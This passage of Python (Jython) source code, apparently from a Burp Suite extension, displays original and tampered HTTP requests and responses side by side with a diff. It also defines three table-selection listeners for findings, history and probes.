            tresp = self._helpers.bytesToString(p["resp"]) if p.get("resp") else "(no response — request may have failed)"
            self._ta_oreq.setText(oreq); self._ta_oreq.setCaretPosition(0)
            self._ta_oresp.setText(oresp); self._ta_oresp.setCaretPosition(0)
            self._ta_treq.setText(treq); self._ta_treq.setCaretPosition(0)
            self._ta_tresp.setText(tresp); self._ta_tresp.setCaretPosition(0)
            self._render_diff(oreq, treq, oresp, tresp)
        except Exception as e:
            self._log("show_probe error: %s" % e)


# ---- selection listeners ----------------------------------------------------
class _FindSelListener(ListSelectionListener):
    def __init__(self, ext):
        self.ext = ext
    def valueChanged(self, e):
        if e.getValueIsAdjusting():
            return
        r = self.ext._find_table.getSelectedRow()
        if r >= 0:
            self.ext.show_finding(r)


class _HistSelListener(ListSelectionListener):
    def __init__(self, ext):
        self.ext = ext
    def valueChanged(self, e):
        if e.getValueIsAdjusting():
            return
        r = self.ext._hist_table.getSelectedRow()
        if r >= 0:
            self.ext.show_history(r)


class _ProbeSelListener(ListSelectionListener):
    def __init__(self, ext):
        self.ext = ext
    def valueChanged(self, e):
        if e.getValueIsAdjusting():
            return
        r = self.ext._probes_table.getSelectedRow()
        if r >= 0:
            self.ext.show_probe(r)
